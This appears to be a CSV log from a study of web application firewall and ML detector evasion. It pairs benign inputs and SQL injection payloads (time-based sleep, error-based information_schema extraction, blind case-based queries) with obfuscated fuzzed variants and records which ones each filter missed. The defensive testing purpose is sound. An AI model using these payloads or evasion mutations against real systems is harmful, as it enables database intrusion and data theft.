Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T22:12:35.798451,2.96618E+15,200,200,200,both_correct,(seLeCt 0x1).96618E+'P' NOT LIKE	'P<',2024-12-16T22:12:36.428455,403,403,both_incorrect,(selECT	0x1).96618E+'P'/**/not like	'P<',2024-12-16T22:12:39.304067,403,200,waf_incorrect_ml_correct,(seLEcT	0x1).96618E+'P'	not like	'P<',2024-12-16T22:12:42.340055,403,200,waf_incorrect_ml_correct,(sELECT	0x1).96618E+'P'	not/*)a>*/liKE 'P<',2024-12-16T22:12:45.410453,403,200,waf_incorrect_ml_correct,(SEleCt 0x1).96618E+'P'	not/*)a>*/like/*Q*r/l*/'P<',2024-12-16T22:12:48.724279,403,200,waf_incorrect_ml_correct
12,2024-12-16T22:12:52.236182,8328,200,200,200,both_correct,"
&&/**/0x1",2024-12-16T22:12:52.567060,200,200,both_correct,"
&&
0x1",2024-12-16T22:12:54.130703,200,200,both_correct,"

AND 
0x1",2024-12-16T22:12:55.542801,200,403,waf_correct_ml_incorrect," 
&&/**/
0x1",2024-12-16T22:12:57.059202,200,200,both_correct,"	
 AND  
0x1",2024-12-16T22:12:58.676121,200,403,waf_correct_ml_incorrect
13,2024-12-16T22:13:00.240501,2095,200,200,200,both_correct,(SELECT	(SELECT/**/2317!=2318)),2024-12-16T22:13:00.575550,403,403,both_incorrect,"(SeleCT	(seLECT
 OR 0=6627<>0x90e))",2024-12-16T22:13:03.131687,403,403,both_incorrect,(SeleCt	(SeLeCT  oR/*P)x*/'>#' LikE '>#'=0x19e3<>0x90e)),2024-12-16T22:13:05.960672,403,200,waf_incorrect_ml_correct,(sElEct	(SeLecT 	OR/*P)x*/'>#' Like/**/'>#' LiKe 0x19e3<>0x90e)),2024-12-16T22:13:09.777287,403,200,waf_incorrect_ml_correct,"(SeLecT	(SElecT 
or/*P)x*/'>#' LIkE '>#' liKE 0x19e3<>0x90e))",2024-12-16T22:13:13.892386,403,200,waf_incorrect_ml_correct
14,2024-12-16T22:13:17.864625,1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,403,403,200,waf_correct_ml_incorrect,"'='='='   )    )    rlike /**/ (
 SElECt   (  caSe WHeN   (  0x17e1  =  1222  )   tHeN 1 ELSE 0x28 EnD   )    )    aNd    (    (    or 0   LIKE   2815",2024-12-16T22:13:24.613305,403,200,waf_correct_ml_incorrect,"'=' LIke '='   )    )	   rlike /**/ (
 sELecT   (  CaSe WHeN   (  0x17e1  =   or 0x0  )   tHeN 1 ElSe 0x28 end   )    )    aND    (    (    OR 0   likE/**/  '~'<>'~O'",2024-12-16T22:13:32.867273,403,200,waf_correct_ml_incorrect,'=' lIke '='   )    )	   rlike   (  sEleCt   (  caSE WhEN   (  0x17e1  =   Or 0x0  )   thEN (SELECT 6551)<>6552 ELse 0x28 eND   )    )    aNd    (    (    OR (SELECT 1)   LikE/*xo%m2*/  '~'<>'~O',2024-12-16T22:13:41.680479,403,200,waf_correct_ml_incorrect,"'=' lIke '='   )    )
   rlike   (  SeLect   (  cASE when   (  0x17e1  =   oR 0x0  )   Then (SeLecT/**/6551)<>(SELECT 1) ELSE 0x28 End   )    )    AnD    (    (    or (sELecT 2665!=(SELECT 2666))   like/**/  '~' not like '~O'",2024-12-16T22:13:52.139683,403,200,waf_correct_ml_incorrect,"'=' LiKe '='   )    )	   rlike   (  sELect   (  CAsE WHeN   (  0x17e1  =   Or 0x0  )   THen (seLEct/**/ AND 1) not like (SELect 0x1) ElSe 0x28 END   )    )    anD    (    (    oR (sElECT 8875 IN (8874,8875,8876)!=(seleCt 2666))   LIKE   '~' not like '~O'",2024-12-16T22:14:03.839588,403,200,waf_correct_ml_incorrect
15,2024-12-16T22:14:17.171561,"1"" where 3274  =  3274 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",403,403,403,both_correct,"(sElECT 1)"" wHErE 3274  =  3274 oR   (  seLEct 9173 FROm  (  seLeCT count  (  *  )  ,concat  (/**/ 0x7171706a71,  (  SelecT   (  elt  (   And 1852=1852  =  9173,1   )    )
    )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FROM information_schema.character_sets group by x  )  a  )  --",2024-12-16T22:14:30.205974,403,200,waf_correct_ml_incorrect,"(SElEcT 1)"" wheRE  AND 1  =  3274 Or   (  SElECt 9173 FROm  ( /**/selEcT count  (  *  )  ,concat  (/*m?T7/*/ 0x7171706a71,  (  seLEcT   (  elt  (   And 1852=1852   LIKE   9173,'k' NOT LIKE 'k4'   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *0x2   )    )   x fRoM information_schema.character_sets group by x  )  a  )  --",2024-12-16T22:14:45.537769,403,403,both_correct,"(SElect 9872 in (9871, or 0,9873))"" WHERe  AnD (SElEct 1)  =  3274 or   (  sELEct 9173 fROm  (  seLEcT count  (  *  )  ,concat  (/*m?T7/*/ 0x7171706a71,  (  SeleCt   (  elt  (   AND 1852=1852   LIke   9173,'k' NOT LIKE 'k4'   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *0x2   )    )   x fRoM information_schema.character_sets group by x  )	 a  )  --",2024-12-16T22:15:02.596390,403,403,both_correct,"(selEct 9872 iN (2526=2526, or 0,9873))"" WHeRe  aND (selecT 1)  =  3274 oR   (  sELect 9173 FRoM  (  SeleCT count  (  *  )  ,concat  (/*m?T7/*/ 0x7171706a71,  (  SelECT   (  elt  (   AND  AND 1 like 0x73c   LIkE   9173,'k' NOT LIKE 'k4'   )    )     )  ,0x717a767a71,floor /**/(  rand  (  0  )  *0x2   )    )   x froM information_schema.character_sets group by x  )
 a  )  --",2024-12-16T22:15:20.454249,403,403,both_correct,"(SElEct 9872 in (2526=2526, oR 0, AND 1))"" WHERE  AND (seLECT 1)  =  3274 or   (  seleCt 'L'='L' from  (/**/ sELeCT count  (  *  )  ,concat  (/*m?T7/*/ 0x7171706a71,  (  SElECt   (  elt  (   And  aND 1 lIke 0x73c	  lIKE   9173,'k' not like 'k4'   )    )     )  ,0x717a767a71,floor /**/(  rand  (  0x0  )  *0x2   )    )   x fRoM information_schema.character_sets group by x  )
 a  )  --",2024-12-16T22:15:39.408955,403,403,both_correct
16,2024-12-16T22:15:58.782532,"poblado de regulares 180, 1d",200,200,200,both_correct,"poblado de regulares  && '	'<>' (SELECT 4)',/**/1d",2024-12-16T22:16:00.259170,403,200,waf_incorrect_ml_correct,"poblado de regulares   AND /**/'
'<>' (SELECT 0x4)',/**/1d",2024-12-16T22:16:03.708728,403,403,both_incorrect,"poblado de
regulares   ANd /**/'
' NOT LIKE ' (SELECT 0x4)', 1d",2024-12-16T22:16:07.552449,200,403,waf_correct_ml_incorrect,"poblado de	regulares   and  '
' not like ' (SELECT 0x4)', 1d",2024-12-16T22:16:11.648112,200,403,waf_correct_ml_incorrect,"poblado	de	regulares   aND  '
' not like ' (SELECT/**/0x4)', 1d",2024-12-16T22:16:15.652114,200,403,waf_correct_ml_incorrect
17,2024-12-16T22:16:20.056759,"calle hemingway, s/n",200,200,200,both_correct,"calle/**/hemingway,
s/n",2024-12-16T22:16:21.141771,200,200,both_correct,"calle hemingway,	s/n",2024-12-16T22:16:23.340791,200,200,both_correct,"calle	hemingway,	s/n",2024-12-16T22:16:25.438302,200,200,both_correct,"calle	hemingway,/*/:!0f*/s/n",2024-12-16T22:16:27.500944,200,200,both_correct,"calle
hemingway,/*/:!0f*/s/n",2024-12-16T22:16:29.912927,200,200,both_correct
18,2024-12-16T22:16:32.359199,cooperma,200,200,200,both_correct,cooperma,2024-12-16T22:16:32.874820,200,200,both_correct,cooperma,2024-12-16T22:16:34.358232,200,200,both_correct,cooperma,2024-12-16T22:16:35.883933,200,200,both_correct,cooperma,2024-12-16T22:16:37.391469,200,200,both_correct,cooperma,2024-12-16T22:16:38.883907,200,200,both_correct
19,2024-12-16T22:16:40.384472,51842682s,200,200,200,both_correct,51842682s,2024-12-16T22:16:40.932521,200,200,both_correct,51842682s,2024-12-16T22:16:42.471828,200,200,both_correct,51842682s,2024-12-16T22:16:44.014320,200,200,both_correct,51842682s,2024-12-16T22:16:45.574827,200,200,both_correct,51842682s,2024-12-16T22:16:47.153151,200,200,both_correct
20,2024-12-16T22:16:48.713437,"1',  (  select   (  case when   (  5586  =  6403  )   then 1 else 5586*  (  select 5586 from mysql.db  )   end   )    )   ",403,403,403,both_correct,"1',  (  selECT   (  cAse WhEN   (  'j'='j'   LIKE   6403  )   thEn 1 eLSe (SeLeCt (SELECT 1))*  (  SElECT 5586 frOM mysql.db  )   EnD	  )    )  /*8J#*/",2024-12-16T22:16:54.500040,403,200,waf_correct_ml_incorrect,"(SELECT 4350 NOT LIKE 4351)',  (  selECT   (  cAse WhEN   (  'j'='j'   liKe   6403  )   thEN 1 else (selEct (SELECt 1))*  (  SElECt 0x15d2 FrOm mysql.db  )   END	  )/**/   )  /*[ )'/*/",2024-12-16T22:17:02.974562,403,403,both_correct,"(SELEct 4350 not like (SelEcT 1))',  (  selECT   (  cAse WhEN /**/ (  'j'='j'   liKe   6403  )   thEN 1 else (selEct (SELECt (SELECT 'Wh'!='Wh=')))*  (  SElECt 0x15d2 FrOm mysql.db  )   END   )/**/   )  /*[ )'/*/",2024-12-16T22:17:12.661973,403,403,both_correct,"(seLEcT 9764 NOT LIKE 9765 not like (sElECt 0x1))',  (  selECT   (  cAse WhEN /**/ (  'j'='j'
  liKe   (SELECT 1)  )   thEN 1 else (selEct (SELECt (SELECT 'Wh'!='Wh LIKE ')))*  (  SElECt 0x15d2 FrOm mysql.db  )  /*ta;*/END   )/**/   )  /*[ )'/*/",2024-12-16T22:17:23.886433,403,403,both_correct,"(seLeCT 9764 not like 9765 not like (sELect 0x1))',  (  selECT   (  cAse WhEN   (  'j'='j'
  liKe   (SELECT 0x1)  )   thEN 5995=(SELECT 1) else (selEct (SELECt (SELECT 'Wh'!='Wh liKe ')))*  (  SElECt 0x15d2 FrOm mysql.db  )  /* #y] */END   )/**/   )  /*[ )'/*/",2024-12-16T22:17:36.456152,403,403,both_correct
21,2024-12-16T22:17:49.966548,miera,200,200,200,both_correct,miera,2024-12-16T22:17:50.349521,200,200,both_correct,miera,2024-12-16T22:17:51.704287,200,200,both_correct,miera,2024-12-16T22:17:53.088045,200,200,both_correct,miera,2024-12-16T22:17:54.455313,200,200,both_correct,miera,2024-12-16T22:17:55.815495,200,200,both_correct
22,2024-12-16T22:17:57.177666,98097212g,200,200,200,both_correct,98097212g,2024-12-16T22:17:57.741839,200,200,both_correct,98097212g,2024-12-16T22:17:59.283434,200,200,both_correct,98097212g,2024-12-16T22:18:00.832499,200,200,both_correct,98097212g,2024-12-16T22:18:02.387646,200,200,both_correct,98097212g,2024-12-16T22:18:03.931078,200,200,both_correct
23,2024-12-16T22:18:05.503624,"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",403,403,200,waf_correct_ml_incorrect,"-8166""   )    )     )   or 5903  =  /**/ (  'qqpjq'||  (  select case 5903 when (SELECT  AND 1) then '.F' LIKE '.F' else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    ( 
   (  ""lcqb""  =  ""lcqb",2024-12-16T22:18:13.781718,403,403,both_correct,"-(SELECT 8166)""   )    )     )   or 5903  =  /**/ (  'qqpjq'||  (  select case '('<>'(W' when (SELECT  AND  OR 0) then '.F' LIKE '.F' else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    ( 	  /*DRS*/(  ""lcqb""  =  ""lcqb",2024-12-16T22:18:24.510244,403,403,both_correct,"-(sELecT 'a'<>'a[')""   )    )     )   or 0x170f  =  /**/ (  'qqpjq'||  (  select case '('<>'(W' when (SELECT  AND /**/OR  AND 1) then '.F' LIKE '.F' else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (    /*DRS*/(  ""lcqb""  =  ""lcqb",2024-12-16T22:18:36.171882,403,403,both_correct,"-(seLECt 'a' not like 'a[')""   )    )   	 )   or 0x170f  =  /**/ (  'qqpjq'||  (  select case '('<>'(W' when (SELECT  AND /**/OR  AND (SELECT '7'<>'78')) then '.F' LIKE '.F' else 0x0 end from rdb$database  )  ||'qzvzq'  )   and    (    (    /*S.*/(  ""lcqb""/**/ =  ""lcqb",2024-12-16T22:18:48.646569,403,403,both_correct,"-(sELEcT 'a' not like 'a[')""   )    )     )   or 0x170f  =  /**/ (  'qqpjq'||  (  select case '('<>'(W' when (SELECT  AND  OR  AND (SELECT '0x7'<>' AND 1 LIKE 315')) then '.F' LIKE '.F' else 0x0 end from rdb$database  )  ||'qzvzq'  )   and    (    (    /*S.*/(  ""lcqb""/**/ =  ""lcqb",2024-12-16T22:19:02.399894,403,403,both_correct
24,2024-12-16T22:19:16.899295,"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc",403,403,200,waf_correct_ml_incorrect,"8003!=8004""  )   and   (  5452 /**/=  (SELECT 6050)  ) 	* AND 1 and   (  ""ciyc"" like ""ciyc",2024-12-16T22:19:20.150494,403,403,both_correct,"8003 NOT LIKE  AND 1""  )   and   (/**/ 6108!=6109 /**/=  (SELECT (SELECT 6050))  ) 	* AND 1 and   (  ""ciyc"" like	""ciyc",2024-12-16T22:19:25.442808,403,403,both_correct,"(SElECt 1) lIKE 5565 not like  and 1""  )   and   (/**/ 6108!=0x17dd  =  (SELECT (SELECT 6050))  )  * AND 1 and   (  ""ciyc"" like	""ciyc",2024-12-16T22:19:32.163653,403,403,both_correct,"(SelEcT 1) lIKe 'Q8xM' NOT LIKE 'Q8xM3' not like  AnD (sELeCt 1)""  )   and   (   OR 0!=0x17dd 	=  (SELECT (SELECT 6050))  )  * AND 1 and   (  ""ciyc"" like	""ciyc",2024-12-16T22:19:39.666516,403,403,both_correct,"(SELECT 1) liKE 'Q8xM' not like 'Q8xM3' not like  ANd (SeLeCt 1828 IN (1827,1828,1829))""  )   and   (   OR 0x0!=0x17dd 	=  (SELECT (SELECT  AND 1))  )  * AND 1 and/**/  (  ""ciyc"" like
""ciyc",2024-12-16T22:19:48.332525,403,403,both_correct
25,2024-12-16T22:19:58.330895,brenda,200,200,200,both_correct,brenda,2024-12-16T22:19:58.745625,200,200,both_correct,brenda,2024-12-16T22:20:00.125732,200,200,both_correct,brenda,2024-12-16T22:20:01.519900,200,200,both_correct,brenda,2024-12-16T22:20:02.928542,200,200,both_correct,brenda,2024-12-16T22:20:04.345437,200,200,both_correct
26,2024-12-16T22:20:05.777532,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""pxix""  =  ""pxix",403,403,403,both_correct,"0x1"" or /**/ ( 
select * from   (  select  (  sleep  (   AND '9'='9'   )    )     )  ydpu  )   and ""pxix""  =  ""pxix",2024-12-16T22:20:10.809212,403,403,both_correct,"0x1"" or   ( 
select * from   (  select  (  sleep  (   AND '0x9'=''z' NOT LIKE 'z:''   )    )     )  ydpu  )   and ""pxix""	 =  ""pxix",2024-12-16T22:20:17.344698,403,403,both_correct,"0x1"" or  	( 
select * from   (  select  (  sleep  (   AND/**/'0x9'=''z' NOT LIKE 'z:''   )    )     )  ydpu  )   and ""pxix""	 =  ""pxix",2024-12-16T22:20:24.513037,403,403,both_correct,"0x1"" or  	( 
select * from   (	 select  (  sleep/**/ (   AND/*K*/'0x9'=''z' NOT LIKE 'z:''   )    )     )  ydpu  )   and ""pxix""	 =  ""pxix",2024-12-16T22:20:31.830932,403,403,both_correct,"0x1"" or  
( 
select * from   (	 select  (  sleep/*/>	*/ (   AND/**/'0x9'=''z' NOT LIKE 'z:''   )    )     )  ydpu /**/)   and ""pxix""	 =  ""pxix",2024-12-16T22:20:39.667576,403,403,both_correct
